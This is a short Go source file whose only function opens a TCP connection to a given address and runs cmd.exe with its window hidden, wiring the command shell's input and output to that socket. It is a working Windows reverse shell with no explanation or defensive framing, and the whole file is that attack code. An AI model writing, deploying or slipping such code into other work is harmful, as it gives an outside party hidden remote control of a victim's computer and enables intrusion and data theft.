package main

import (
	"net"
	"os/exec"
	"syscall"
)

func shell(address string) {
	socket, _ := net.Dial("tcp", address)
	shell := exec.Command("cmd.exe")
	shell.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	shell.Stdin = socket
	shell.Stdout = socket
	shell.Stderr = socket
	shell.Run()
}
